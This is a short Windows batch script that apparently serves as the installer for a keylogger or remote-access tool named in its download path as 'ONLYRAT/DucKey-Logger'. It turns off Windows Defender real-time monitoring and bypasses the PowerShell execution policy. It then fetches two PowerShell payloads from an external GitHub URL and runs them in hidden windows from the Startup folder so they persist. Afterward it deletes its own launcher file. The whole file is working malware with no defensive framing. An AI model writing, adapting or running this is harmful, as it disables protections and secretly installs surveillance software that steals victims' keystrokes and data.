@echo off
@REM variables
set INITIALPATH=%cd%
set STARTUPPATH=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup

cd %STARTUPPATH%

powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope Process
powershell -C "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YouS0/ONLYRAT/main/DucKey-Logger/p.ps1' -OutFile 'p.ps1'"
powershell -C "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YouS0/ONLYRAT/main/DucKey-Logger/l.ps1' -OutFile 'l.ps1'"
(
    echo powershell Set-MpPreference -DisableRealtimeMonitoring $true
    echo powershell Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope Process
    echo powershell Start-Process powershell.exe -WindowStyle Hidden ".\l.ps1"
    echo powershell Start-Process powershell.exe -WindowStyle Hidden ".\p.ps1"
) > c.cmd
powershell start-process -WindowStyle Hidden ".\c.cmd"
@REM cd to initial path
cd %INITIALPATH%

@REM delete initial.cmd
del c.cmd

